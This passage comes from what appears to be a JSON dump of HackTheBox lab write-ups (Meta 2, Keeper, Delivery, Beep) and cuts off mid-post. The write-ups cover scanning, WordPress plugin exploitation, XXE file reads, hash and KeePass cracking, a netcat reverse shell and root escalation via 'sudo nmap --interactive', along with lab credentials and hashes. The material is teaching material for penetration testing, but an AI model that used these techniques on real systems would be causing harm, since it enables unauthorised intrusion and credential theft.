.cachedrwx------ 1 root root 22 Dec 13 2021 .config-rw------- 1 root root 39 Dec 31 2021 .lesshstdrwxr-xr-x 1 root root 90 Dec 13 2021 .npmdrwxr-xr-x 1 root root 148 Jul 26 08:26 .pm2-rw-r--r-- 1 root root 161 Dec 5 2019 .profiledrwx------ 1 root root 30 Jul 2 2021 .ssh-rw------- 1 root root 13633 Jan 4 2022 .viminfo-rw-r--r-- 1 root root 33 Jul 26 08:26 root.txtdrwxr-xr-x 1 root root 6 Jul 2 2021 snaproot@nodeblog:~# cat root.txt e43ebbee89cd354bb93d59d1b99c186eroot@nodeblog:~#```{: .nolineno}> If you have any questions or suggestions, please leave a comment below.Thank You ! {: .prompt-tip }" }, { "title": "Meta 2", "url": "/posts/Meta-2/", "categories": "HackTheBox", "tags": "FTP, PrivEsc, Public Exploit, Wordpress", "date": "2023-09-01 00:00:00 +0530", "snippet": "```jsxIP : 10.10.11.186```{: .nolineno}## Port Scan Results â¤µï¸```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/metatwo]â””â”€$ sudo nmap -sC -sV -p- -T4 -oN Nmap_results.txt 10.10.11.186[sudo] password for kali: Sta...", "content": "```jsxIP : 10.10.11.186```{: .nolineno}## Port Scan Results â¤µï¸```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/metatwo]â””â”€$ sudo nmap -sC -sV -p- -T4 -oN Nmap_results.txt 10.10.11.186[sudo] password for kali: Starting Nmap 7.93 ( https:/nmap.org ) at 2023-04-18 21:26 ISTNmap scan report for 10.10.11.186Host is up (0.28s latency).Not shown: 65532 closed tcp ports (reset)PORT STATE SERVICE VERSION21/tcp open ftp| fingerprint-strings: | GenericLines: | 220 ProFTPD Server (Debian) [::ffff:10.10.11.186]| Invalid command: try being more creative|_ Invalid command: try being more creative22/tcp open ssh OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)| ssh-hostkey: | 3072 c4b44617d2102d8fec1dc927fecd79ee (RSA)| 256 2aea2fcb23e8c529409cab866dcd4411 (ECDSA)|_ 256 fd78c0b0e22016fa050debd83f12a4ab (ED25519)80/tcp open http nginx 1.18.0|_http-title: Did not follow redirect to http:/metapress.htb/|_http-server-header: nginx/1.18.01 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https:/nmap.org/cgi-bin/submit.cgi?new-service :SF-Port21-TCP:V=7.93%I=7%D=4/18%Time=643EBFA3%P=x86_64-pc-linux-gnu%r(GeneSF:ricLines,8F,\"220\\x20ProFTPD\\x20Server\\x20\\(Debian\\)\\x20\\[::ffff:10\\.10\\SF:.11\\.186\\]\\r\\n500\\x20Invalid\\x20command:\\x20try\\x20being\\x20more\\x20creSF:ative\\r\\n500\\x20Invalid\\x20command:\\x20try\\x20being\\x20more\\x20creativeSF:\\r\\n\");Service Info: ; CPE: cpe:/o:linux:linux_kernel```{: .nolineno}## Web Enumerration â¤µï¸Now lets set the `/etc/hosts` file as `metapress.htb/`![Untitled](/Vulnhub-Files/img/Meta-2/Untitled.png)robots.txt âž¡ï¸![Untitled](/Vulnhub-Files/img/Meta-2/Untitled%201.png)I know that we have wordpress version 5.6.2 site so lets run `wpscan` here >>I got 2 users >>![Untitled](/Vulnhub-Files/img/Meta-2/Untitled%202.png)I got know about this exploit >>>![Untitled](/Vulnhub-Files/img/Meta-2/Untitled%203.png)I got exploit related to xml but no response , So therefore I dig into the source code and I found bookingpress term from the link >>![Untitled](/Vulnhub-Files/img/Meta-2/Untitled%204.png)So I searched from metasploit and I got this â¤µï¸![Untitled](/Vulnhub-Files/img/Meta-2/Untitled%205.png)Now lets run this >>![Untitled](/Vulnhub-Files/img/Meta-2/Untitled%206.png)```bashWordpress User Credentials=================== Username Email Hash -------- ----- ---- admin admin@metapress.htb $P$BGrGrgf2wToBS79i07Rk9sN4Fzk.TV. manager manager@metapress.htb $P$B4aNM28N0E.tMy/JIcnVMZbGcU16Q70```{: .nolineno}Now lets crack the hashes with john the ripper >>![Untitled](/Vulnhub-Files/img/Meta-2/Untitled%207.png)```bashCredentials >>manager : partylikearockstar ```{: .nolineno}![Untitled](/Vulnhub-Files/img/Meta-2/Untitled%208.png)Now When I logged in I got the access to upload the media Library files >> And also earlier I found the **XXE Authenticated exploit** so letâ€™s use it now â¤µï¸ ![Untitled](/Vulnhub-Files/img/Meta-2/Untitled%209.png)Now use this decode.php file for base64 decoding >>![Untitled](/Vulnhub-Files/img/Meta-2/Untitled%2010.png)I got it what I wanted >>![Untitled](/Vulnhub-Files/img/Meta-2/Untitled%2011.png)I checked for nginx config files `/etc/nginx/sites-enabled/default`>>![Untitled](/Vulnhub-Files/img/Meta-2/Untitled%2012.png)Now lets find the wp-config.php file which is in location : `/var/www/metapress.htb/blog/wp-config.php` >>![Untitled](/Vulnhub-Files/img/Meta-2/Untitled%2013.png)```bashCredentials >>Database >>blog : 635Aq@TdqrCwXFUZFTP >>metapress.htb : 9NYS_ii@FyL_p5M2NvJ```{: .nolineno}Now lets log into the FTP server âž¡ï¸![Untitled](/Vulnhub-Files/img/Meta-2/Untitled%2014.png)Look What I found >>```bashftp> cat send_email.php?Invalid command.ftp> less send_email.phpSMTPDebug = 3; $mail->isSMTP(); $mail->Host = \"mail.metapress.htb\";$mail->SMTPAuth = true; $mail->Username = \"jnelson@metapress.htb\"; $mail->Password = \"Cb4_JmWM8zUZWMu@Ys\"; $mail->SMTPSecure = \"tls\"; $mail->Port = 587; $mail->From = \"jnelson@metapress.htb\";$mail->FromName = \"James Nelson\";$mail->addAddress(\"info@metapress.htb\");$mail->isHTML(true);$mail->Subject = \"Startup\";$mail->Body = \"We just started our new blog metapress.htb!\";try { $mail->send(); echo \"Message has been sent successfully\";} catch (Exception $e) { echo \"Mailer Error: \" . $mail->ErrorInfo;}```{: .nolineno}Now its Local privilege escalation time â¤µï¸![Untitled](/Vulnhub-Files/img/Meta-2/Untitled%2015.png)```bashjnelson@meta2:~$ cat user.txtdf1f5e42cd365d9d52b4df09622554f9jnelson@meta2:~$```{: .nolineno}Now I got to know about passpie from https:/github.com/marcwebbie/passpie >>![Untitled](/Vulnhub-Files/img/Meta-2/Untitled%2016.png)So for using its `export` command I need a paraphrase so for that I can get our passwords for root user ,therefore I have to crack the `./.keys` (private keys) from john to get that paraphrase.![Untitled](/Vulnhub-Files/img/Meta-2/Untitled%2017.png)![Untitled](/Vulnhub-Files/img/Meta-2/Untitled%2018.png)Now I get it â¤µï¸![Untitled](/Vulnhub-Files/img/Meta-2/Untitled%2019.png)```bashroot : p7qfAZt4_A1xo_0xjnelson : Cb4_JmWM8zUZWMu@Ys```{: .nolineno}Now itâ€™s time for root âž¡ï¸```bashroot@meta2:~# cat root.txtc973cba68e3d1077ea7501c44ed04804root@meta2:~#```{: .nolineno}> If you have any questions or suggestions, please leave a comment below.Thank You ! {: .prompt-tip }" }, { "title": "Keeper", "url": "/posts/Keeper/", "categories": "HackTheBox", "tags": "Keepass, PrivEsc, putty_gen", "date": "2023-09-01 00:00:00 +0530", "snippet": "![Untitled](/Vulnhub-Files/img/Keeper/Untitled.png) â­ [Box Profile](https://www.hackthebox.com/achievement/machine/595651/556)## Port Scan Results â¤µï¸```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/HTB/Keeper]â””â”€...", "content": "![Untitled](/Vulnhub-Files/img/Keeper/Untitled.png) â­ [Box Profile](https://www.hackthebox.com/achievement/machine/595651/556)## Port Scan Results â¤µï¸```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/HTB/Keeper]â””â”€$ sudo nmap -sC -sV -T4 10.10.11.227 -oN Nmap_results.txtStarting Nmap 7.94 ( https:/nmap.org ) at 2023-08-28 13:17 ISTNmap scan report for 10.10.11.227Host is up (0.16s latency).Not shown: 998 closed tcp ports (reset)PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 8.9p1 Ubuntu 3ubuntu0.3 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 256 35:39:d4:39:40:4b:1f:61:86:dd:7c:37:bb:4b:98:9e (ECDSA)|_ 256 1a:e9:72:be:8b:b1:05:d5:ef:fe:dd:80:d8:ef:c0:66 (ED25519)80/tcp open http nginx 1.18.0 (Ubuntu)|_http-title: Site does not have a title (text/html).Service Info: ; CPE: cpe:/o:linux:linux_kernel```{: .nolineno}## Web Enumeration â¤µï¸On loading the port 80 I got this redirect link â†’![Untitled](/Vulnhub-Files/img/Keeper/Untitled%201.png)Now when I get the /etc/hosts file as `tickets.keeper.htb` I got this Request Tracker page Login Page â†’![Untitled](/Vulnhub-Files/img/Keeper/Untitled%202.png)Now with default credentails I used username : root , password : password and I got into the login page â†’![Untitled](/Vulnhub-Files/img/Keeper/Untitled%203.png)While Enumeration I got this content â†’![Untitled](/Vulnhub-Files/img/Keeper/Untitled%204.png)I got a username and the password in comments column â†’![Untitled](/Vulnhub-Files/img/Keeper/Untitled%205.png)Credentials â†’```bashlnorgaard : Welcom2023!```{: .nolineno}## Shell â¤µï¸```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/HTB/Keeper]â””â”€$ ssh lnorgaard@keeper.htb The authenticity of host 'keeper.htb (10.10.11.227)' cant be established.ED25519 key fingerprint is SHA256:hczMXffNW5M3qOppqsTCzstpLKxrvdBjFYoJXJGpr7w.This key is not known by any other names.Are you sure you want to continue connecting (yes/no/[fingerprint])? yesWarning: Permanently added 'keeper.htb' (ED25519) to the list of known hosts.lnorgaard@keeper.htb is password: Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-78-generic x86_64) * Documentation: https:/help.ubuntu.com * Management: https:/landscape.canonical.com * Support: https:/ubuntu.com/advantageFailed to connect to https:/changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settingsYou have mail.Last login: Mon Aug 28 10:13:23 2023 from 10.10.15.16lnorgaard@keeper:~$```{: .nolineno}Lets dig deeper â†’```bashlnorgaard@keeper:~$ ls -altotal 333032drwxr-xr-x 5 lnorgaard lnorgaard 4096 Aug 28 09:58 .drwxr-xr-x 3 root root 4096 May 24 16:09 ..lrwxrwxrwx 1 root root 9 May 24 15:55 .bash_history -> /dev/null-rw-r--r-- 1 lnorgaard lnorgaard 220 May 23 14:43 .bash_logout-rw-r--r-- 1 lnorgaard lnorgaard 3771 May 23 14:43 .bashrcdrwx------ 2 lnorgaard lnorgaard 4096 May 24 16:09 .cachedrwx------ 3 lnorgaard lnorgaard 4096 Aug 28 09:13 .gnupg-rwxr-x--- 1 lnorgaard lnorgaard 253395188 May 24 12:51 KeePassDumpFull.dmp-rw------- 1 lnorgaard lnorgaard 20 Aug 28 09:34 .lesshst-rwxr-x--- 1 lnorgaard lnorgaard 3630 May 24 12:51 passcodes.kdbx-rw-rw-r-- 1 lnorgaard lnorgaard 2735 Aug 28 09:40 poc.py-rw------- 1 lnorgaard lnorgaard 807 May 23 14:43 .profile-rw------- 1 lnorgaard lnorgaard 5 Aug 28 09:15 .python_history-rw-rw-r-- 1 lnorgaard lnorgaard 156929 Aug 28 09:14 res.txt-rw-r--r-- 1 root root 87391651 Aug 28 10:28 RT30000.zipdrwx------ 2 lnorgaard lnorgaard 4096 Jul 24 10:25 .ssh-rw------- 1 lnorgaard lnorgaard 12288 Aug 28 09:08 .swp-rw-r----- 1 root lnorgaard 33 Aug 28 09:00 user.txt-rw-r--r-- 1 root root 39 Jul 20 19:03 .vimrclnorgaard@keeper:~$ cat user.txt 2b10a78fdfebe350af5b4f9635b38c6alnorgaard@keeper:~$```{: .nolineno}Now I extracted this RT30000.zip file in my host machine and got 2 files 1 file contains dumps of that passwords which will be used to crack the other file which is a keepass password file named as `passcodes.kdbx`![Untitled](/Vulnhub-Files/img/Keeper/Untitled%206.png)![Untitled](/Vulnhub-Files/img/Keeper/Untitled%207.png)To crack this password I need to download a .NET script to extract the password from this .dmp file â†’https:/github.com/CMEPW/keepass-dump-masterkeyNow I extracted the password using this above code â†’```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/HTB/Keeper]â””â”€$ python3 poc.py -d KeePassDumpFull.dmp2023-08-28 15:24:07,331 [.] [main] Opened KeePassDumpFull.dmpPossible password: â—,dgrâ—d med flâ—dePossible password: â—ldgrâ—d med flâ—dePossible password: â—`dgrâ—d med flâ—dePossible password: â—-dgrâ—d med flâ—dePossible password: â—`dgrâ—d med flâ—dePossible password: â—]dgrâ—d med flâ—dePossible password: â—Adgrâ—d med flâ—dePossible password: â—Idgrâ—d med flâ—dePossible password: â—:dgrâ—d med flâ—dePossible password: â—=dgrâ—d med flâ—dePossible password: â—_dgrâ—d med flâ—dePossible password: â—cdgrâ—d med flâ—dePossible password: â—Mdgrâ—d med flâ—de```{: .nolineno}I have to guessed it but I searched on web and it is Dutch language â†’![Untitled](/Vulnhub-Files/img/Keeper/Untitled%208.png)so lets extract this data â†’![Untitled](/Vulnhub-Files/img/Keeper/Untitled%209.png)![Untitled](/Vulnhub-Files/img/Keeper/Untitled%2010.png)Now I got this putty id_rsa key so I copied all the Notes content into `keeper.txt` file and for making it into its `id_rsa` format I have used a script called puttygen and specified its type and output file â†’```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/HTB/Keeper]â””â”€$ puttygen keeper.txt -O private-openssh -o id_rsa```{: .nolineno}Now Lets login into the root with this private key and also change its file permission to 600 â†’```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/HTB/Keeper]â””â”€$ sudo ssh root@tickets.keeper.htb -i id_rsaThe authenticity of host 'tickets.keeper.htb (10.10.11.227)' cant be established.ED25519 key fingerprint is SHA256:hczMXffNW5M3qOppqsTCzstpLKxrvdBjFYoJXJGpr7w.This key is not known by any other names.Are you sure you want to continue connecting (yes/no/[fingerprint])? yesWarning: Permanently added 'tickets.keeper.htb' (ED25519) to the list of known hosts.Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-78-generic x86_64) * Documentation: https:/help.ubuntu.com * Management: https:/landscape.canonical.com * Support: https:/ubuntu.com/advantageYou have new mail.Last login: Tue Aug 8 19:00:06 2023 from 10.10.14.41root@keeper:~# whoamirootroot@keeper:~# iduid=0(root) gid=0(root) groups=0(root)root@keeper:~# ls -altotal 85384drwx------ 5 root root 4096 Jul 27 13:57 .drwxr-xr-x 18 root root 4096 Jul 27 13:52 ..lrwxrwxrwx 1 root root 9 May 24 15:54 .bash_history -> /dev/null-rw-r--r-- 1 root root 3106 Dec 5 2019 .bashrcdrwx------ 2 root root 4096 May 24 16:58 .cache-rw------- 1 root root 20 Jul 27 13:57 .lesshstlrwxrwxrwx 1 root root 9 May 24 15:54 .mysql_history -> /dev/null-rw-r--r-- 1 root root 161 Dec 5 2019 .profile-rw-r----- 1 root root 33 Aug 28 13:13 root.txt-rw-r--r-- 1 root root 87391651 Jul 25 19:56 RT30000.zipdrwxr-xr-x 2 root root 4096 Jul 25 20:11 SQLdrwxr-xr-x 2 root root 4096 May 24 16:09 .ssh-rw-r--r-- 1 root root 39 Jul 20 19:03 .vimrcroot@keeper:~# cat root.txte034f821aeb7de6d2677c1776ac482b8root@keeper:~#```{: .nolineno}> If you have any questions or suggestions, please leave a comment below.Thank You ! {: .prompt-tip }" }, { "title": "Delivery", "url": "/posts/Delivery/", "categories": "HackTheBox", "tags": "Password Cracking, hashcat, mysql", "date": "2023-09-01 00:00:00 +0530", "snippet": "### Lets see the IP address â†’```bashIP : 10.10.10.222```{: .nolineno}## Port Scan Results âž¡ï¸```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/HTB/Delivery]â””â”€$ cat Nmap_results.txt # Nmap 7.94 scan initiated Sat J...", "content": "### Lets see the IP address â†’```bashIP : 10.10.10.222```{: .nolineno}## Port Scan Results âž¡ï¸```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/HTB/Delivery]â””â”€$ cat Nmap_results.txt # Nmap 7.94 scan initiated Sat Jul 22 20:50:05 2023 as: nmap -sC -sV -p- -T4 -oN Nmap_results.txt 10.10.10.222Warning: 10.10.10.222 giving up on port because retransmission cap hit (6).Nmap scan report for 10.10.10.222Host is up (0.29s latency).Not shown: 65531 closed tcp ports (reset)PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)| ssh-hostkey: | 2048 9c:40:fa:85:9b:01:ac:ac:0e:bc:0c:19:51:8a:ee:27 (RSA)| 256 5a:0c:c0:3b:9b:76:55:2e:6e:c4:f4:b9:5d:76:17:09 (ECDSA)|_ 256 b7:9d:f7:48:9d:a2:f2:76:30:fd:42:d3:35:3a:80:8c (ED25519)80/tcp open http nginx 1.14.2|_http-title: Welcome|_http-server-header: nginx/1.14.27640/tcp filtered unknown8065/tcp open unknown| fingerprint-strings: | GenericLines, Help, RTSPRequest, SSLSessionReq, TerminalServerCookie: | HTTP/1.1 400 Bad Request| Content-Type: text/plain; charset=utf-8| Connection: close| Request| GetRequest: | HTTP/1.0 200 OK| Accept-Ranges: bytes| Cache-Control: no-cache, max-age=31556926, public| Content-Length: 3108| Content-Security-Policy: frame-ancestors 'self'; script-src 'self' cdn.rudderlabs.com| Content-Type: text/html; charset=utf-8| Last-Modified: Fri, 21 Jul 2023 04:15:37 GMT| X-Frame-Options: SAMEORIGIN| X-Request-Id: nwx7nko6ntgdbc4rdoham9qtuc| X-Version-Id: 5.30.0.5.30.1.57fb31b889bf81d99d8af8176d4bbaaa.false| Date: Sat, 22 Jul 2023 15:58:33 GMT| Mattermost /dev/null-rw-r--r-- 1 maildeliverer maildeliverer 220 Dec 26 2020 .bash_logout-rw-r--r-- 1 maildeliverer maildeliverer 3526 Dec 26 2020 .bashrcdrwx------ 3 maildeliverer maildeliverer 4096 Jul 21 11:25 .gnupg-rw------- 1 maildeliverer maildeliverer 317 Jul 22 06:29 .mysql_history-rw-r--r-- 1 maildeliverer maildeliverer 807 Dec 26 2020 .profile-r-------- 1 maildeliverer maildeliverer 33 Jul 21 00:15 user.txtmaildeliverer@Delivery:~$ cat user.txt86802dfee1c5dd0c21f39519ab8b69dfmaildeliverer@Delivery:~$```{: .nolineno}Now I got this data of mysql from `/opt/mattermost/config` â†’![Untitled](/Vulnhub-Files/img/Delivery/Untitled%2012.png)```bashmmuser : Crack_The_MM_Admin_PW```{: .nolineno}Now lets login into mysql â†’```bashmaildeliverer@Delivery:/opt/mattermost/config$ mysql -u mmuser -pEnter password: Welcome to the MariaDB monitor. Commands end with ; or \\g.Your MariaDB connection id is 613Server version: 10.3.27-MariaDB-0+deb10u1 Debian 10Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.Type 'help;' or '\\h' for help. Type '\\c' to clear the current input statement.MariaDB [(none)]> show databases;+--------------------+| Database |+--------------------+| information_schema || mattermost |+--------------------+2 rows in set (0.001 sec)MariaDB [(none)]> use mattermost;Reading table information for completion of table and column namesYou can turn off this feature to get a quicker startup with -ADatabase changedMariaDB [mattermost]> select Username , Password from Users;+----------------------------------+--------------------------------------------------------------+| Username | Password |+----------------------------------+--------------------------------------------------------------+| test | $2a$10$oBtBq1ZASVLBM6Cc4FwDg.D3epLnMPglp2xYztpEuLlyLQJwy27gS || surveybot | || c3ecacacc7b94f909d04dbfd308a9b93 | $2a$10$u5815SIBe2Fq1FZlv9S8I.VjU3zeSPBrIEg9wvpiLaS7ImuiItEiK || strongshiv8 | $2a$10$TLz3Oq8FKGhHouhuRIbAq.43URK6Dunpj9p93hl6a8pQknnI4NmEe || 5b785171bfb34762a933e127630c4860 | $2a$10$3m0quqyvCE8Z/R1gFcCOWO6tEj6FtqtBn8fRAXQXmaKmg.HDGpS/G || nano | $2a$10$k40E3b3uZA1L1Q4Fr.di3.KaUvp9I9P14RkDvL8ymOir/hDL4WsG6 || test0 | $2a$10$RFLKscyJLQ2RqVsYZv7VVeraNgLvMln524xhNbjUcDRDJGOQT39T6 || root | $2a$10$VM6EeymRxJ29r8Wjkr8Dtev0O.1STWb4.4ScG.anuu7v0EFJwgjjO || burtone123 | $2a$10$PWvOfJ5P7ruDfo3Us2RQQeyYVqV2SH2kt1VrOtOAX4jteqAAcFWei || ff0a21fc6fc2488195e16ea854c963ee | $2a$10$RnJsISTLc9W3iUcUggl1KOG9vqADED24CQcQ8zvUm1Ir9pxS.Pduq || yoyo | $2a$10$DiUs6XzuEXwhDbihGob2K.CRU14azuvGq1v1uiwyUuhsaJy6Js/RO || shivaa | $2a$10$UL0J.kFYNqZ4MGewAI2coOw3UAtRsN78C8JX9PyDTNNsI9EH9u7ee || aadmin | $2a$10$TE6BrubBaGRhIGFQ/ahbgOoTaHYQY6evvUYMhPlb0MU.FsYZDXqjW || burton | $2a$10$hQV3hUwtmbSyIAy36Q9Vru/slpaEn8D0.2RnEWphywZc8cfa/jCLW || channelexport | || user | $2a$10$eb5N2iNdWX7tynvOnzrcCum3QbbXCfzEyrYZBnU5PYTogswASdvq. || admin | $2a$10$mKrdPgEVo.fJd/GM3vHTGecp0Urk91T.276FgNZIpU1epEAU153Jm || hicham | $2a$10$wQQsqKXO9hoSe7Dg2jnMLOW9lEh05R6oejv5e84xfc3.W3uFra8gu || 9ecfb4be145d47fda0724f697f35ffaf | $2a$10$s.cLPSjAVgawGOJwB7vrqenPg2lrDtOECRtjwWahOzHfq1CoFyFqm || shiva | $2a$10$AMzTQgqkB51l/Tm1EY3VMuKr3pzzVB2AbEzXcyIoge07uEf/m.OZq || hacker | $2a$10$XzdgayAqGbJx4lrbPyKkJ.fEIv4kQ1ch5pN9s6s6hOfS9/bh4KXnK |+----------------------------------+--------------------------------------------------------------+21 rows in set (0.001 sec)MariaDB [mattermost]>```{: .nolineno}I got the root credentials â†’```bashroot : $2a$10$VM6EeymRxJ29r8Wjkr8Dtev0O.1STWb4.4ScG.anuu7v0EFJwgjjO ```{: .nolineno}Now I got nothing so far for root user access and also I cant able to crack this hash from rockyou.txt file , then I looked into starting points ,so I found something â†’![Untitled](/Vulnhub-Files/img/Delivery/Untitled%2013.png)So lets use the hashcat rules here and lets create the password file â†’```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/HTB/Delivery]â””â”€$ hashcat -r /usr/share/hashcat/rules/best64.rule --stdout file > password.txt```{: .nolineno}Now lets use this password and crack the root user hash password â†’```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/HTB/Delivery]â””â”€$ hashcat -m 3200 hashes.txt password.txt hashcat (v6.2.6) startingOpenCL API (OpenCL 3.0 PoCL 3.1+debian Linux, None+Asserts, RELOC, SPIR, LLVM 15.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]===========================================================================================================================================* Device #1: pthread-penryn-Intel(R) Core(TM) i5-8300H CPU @ 2.30GHz, 2914/5893 MB (1024 MB allocatable), 2MCUMinimum password length supported by kernel: 0Maximum password length supported by kernel: 72Hashes: 1 digests; 1 unique digests, 1 unique saltsBitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotatesRules: 1Optimizers applied:* Zero-Byte* Single-Hash* Single-SaltWatchdog: Temperature abort trigger set to 90cHost memory required for this attack: 0 MBDictionary cache built:* Filename..: password.txt* Passwords.: 77* Bytes.....: 1177* Keyspace..: 77* Runtime...: 0 secs$2a$10$VM6EeymRxJ29r8Wjkr8Dtev0O.1STWb4.4ScG.anuu7v0EFJwgjjO : PleaseSubscribe!21```{: .nolineno}Wow I got this password lets have a root access â†’```bashmaildeliverer@Delivery:/$ su rootPassword: root@Delivery:/# whoamirootroot@Delivery:/# iduid=0(root) gid=0(root) groups=0(root)root@Delivery:/# cd /rootroot@Delivery:~# ls -altotal 44drwx------ 5 root root 4096 Jul 14 2021 .drwxr-xr-x 19 root root 4096 Jul 14 2021 ..lrwxrwxrwx 1 root root 9 Dec 28 2020 .bash_history -> /dev/null-rw-r--r-- 1 root root 570 Jan 31 2010 .bashrcdrwxr-xr-x 3 root root 4096 Jul 14 2021 .cachedrwx------ 3 root root 4096 Jul 14 2021 .gnupg-rwxr-x--- 1 root root 103 Dec 26 2020 mail.sh-r-------- 1 root root 382 Dec 28 2020 note.txt-rw-r----- 1 root root 148 Aug 17 2015 .profile-rw-r----- 1 root root 1499 Dec 26 2020 py-smtp.py-r-------- 1 root root 33 Jul 21 00:15 root.txtdrwxr-xr-x 2 root root 4096 Jul 14 2021 .vimroot@Delivery:~# cat root.txt277e10b4c506e887de54f5a812c402fbroot@Delivery:~# cat note.txtI hope you enjoyed this box, the attack may seem silly but it demonstrates a pretty high risk vulnerability I have seen several times. The inspiration for the box is here: - https:/medium.com/intigriti/how-i-hacked-hundreds-of-companies-through-their-helpdesk-b7680ddc2d4c Keep on hacking! And please dont forget to subscribe to all the security streamers out there.- ippsecroot@Delivery:~#```{: .nolineno}> If you have any questions or suggestions, please leave a comment below.Thank You ! {: .prompt-tip }" }, { "title": "Beep", "url": "/posts/Beep/", "categories": "HackTheBox", "tags": "PrivEsc, Public Exploit", "date": "2023-09-01 00:00:00 +0530", "snippet": "### Let see the IP Address first â†’```bashIP : 10.10.10.7```{: .nolineno}## Port Scan Results âž¡ï¸```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/HTB/Beep]â””â”€$ sudo nmap -sC -sV -p- -T4 -oN Nmap_results.txt 10.10.1...", "content": "### Let see the IP Address first â†’```bashIP : 10.10.10.7```{: .nolineno}## Port Scan Results âž¡ï¸```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/HTB/Beep]â””â”€$ sudo nmap -sC -sV -p- -T4 -oN Nmap_results.txt 10.10.10.7 [sudo] password for kali: Starting Nmap 7.94 ( https:/nmap.org ) at 2023-07-19 19:47 ISTNmap scan report for 10.10.10.7Host is up (0.19s latency).Not shown: 65520 closed tcp ports (reset)PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 4.3 (protocol 2.0)| ssh-hostkey: | 1024 ad:ee:5a:bb:69:37:fb:27:af:b8:30:72:a0:f9:6f:53 (DSA)|_ 2048 bc:c6:73:59:13:a1:8a:4b:55:07:50:f6:65:1d:6d:0d (RSA)25/tcp open smtp?|_smtp-commands: Couldnt establish connection on port 2580/tcp open http Apache httpd 2.2.3|_http-title: Did not follow redirect to https:/10.10.10.7/|_http-server-header: Apache/2.2.3 (CentOS)110/tcp open pop3?111/tcp open rpcbind 2 (RPC #100000)| rpcinfo: | program version port/proto service| 100000 2 111/tcp rpcbind| 100000 2 111/udp rpcbind| 100024 1 875/udp status|_ 100024 1 878/tcp status143/tcp open imap?443/tcp open ssl/http Apache httpd 2.2.3 ((CentOS))| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--| Not valid before: 2017-04-07T08:22:08|_Not valid after: 2018-04-07T08:22:08|_ssl-date: 2023-07-19T14:49:38+00:00; +2s from scanner time.|_http-title: Elastix - Login page| http-robots.txt: 1 disallowed entry |_/878/tcp open status 1 (RPC #100024)993/tcp open imaps?995/tcp open pop3s?3306/tcp open mysql MySQL (unauthorized)4190/tcp open sieve?4445/tcp open upnotifyp?4559/tcp open hylafax?5038/tcp open asterisk Asterisk Call Manager 1.1Service Info: Host: 127.0.0.1Host script results:|_clock-skew: 1s```{: .nolineno}## Web Enumeration âž¡ï¸This site doesnâ€™t work with that old TLS 1.2 version of firefox browser so I redirected the site with the help of burpuite â†’![Untitled](/Vulnhub-Files/img/Beep/Untitled.png)![Untitled](/Vulnhub-Files/img/Beep/Untitled%201.png)Now lets see the site â†’![Untitled](/Vulnhub-Files/img/Beep/Untitled%202.png)Now I recon about elastix exploit and I found one exploit interesting which leads to RCE directly so letâ€™s try it out now â†’ [*Exploit*](https://www.exploit-db.com/exploits/18650)But this exploit needs modification so I find this exploit modified from this [**site**](https://github.com/infosecjunky/FreePBX-2.10.0---Elastix-2.2.0---Remote-Code-Execution/) and use it â†’![Untitled](/Vulnhub-Files/img/Beep/Untitled%203.png)![Untitled](/Vulnhub-Files/img/Beep/Untitled%204.png)In response to that I got a reverse shell as directed and after following this exploit path I got root too â†’```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/HTB/Beep]â””â”€$ nc -lvnp 4444listening on [any] 4444 ...connect to [10.10.14.213] from (UNKNOWN) [10.10.10.7] 38362which python/usr/bin/pythonpython -c 'import pty;pty.spawn(\"/bin/bash\")'bash-3.2$ whoamiwhoamiasteriskbash-3.2$ pwdpwd/tmpbash-3.2$ ididuid=100(asterisk) gid=101(asterisk)bash-3.2$ sudo nmap --interactivesudo nmap --interactiveStarting Nmap V. 4.11 ( http:/www.insecure.org/nmap/ )Welcome to Interactive Mode -- press h for helpnmap> !sh!shsh-3.2# whoamiwhoamirootsh-3.2# ididuid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel)sh-3.2# cd /rootcd /rootsh-3.2# ls -alls -altotal 16308drwxr-x--- 2 root root 4096 Jul 16 2019 .drwxr-xr-x 22 root root 4096 Jul 19 13:15 ..-rw------- 1 root root 6025 Apr 7 2017 anaconda-ks.cfg-rw------- 1 root root 1067 Aug 25 2017 .bash_history-rw-r--r-- 1 root root 24 Jan 6 2007 .bash_logout-rw-r--r-- 1 root root 191 Jan 6 2007 .bash_profile-rw-r--r-- 1 root root 176 Jan 6 2007 .bashrc-rw-r--r-- 1 root root 100 Jan 6 2007 .cshrc-r-xr-xr-x 1 root root 190461 Aug 10 2011 elastix-pr-2.2-1.i386.rpm-rw-r--r-- 1 root root 18433 Apr 7 2017 install.log-rw-r--r-- 1 root root 0 Apr 7 2017 install.log.syslog-rw-r--r-- 1 root root 1 Apr 7 2017 postnochroot-rw------- 1 root root 33 Jul 19 13:15 root.txt-rw-r--r-- 1 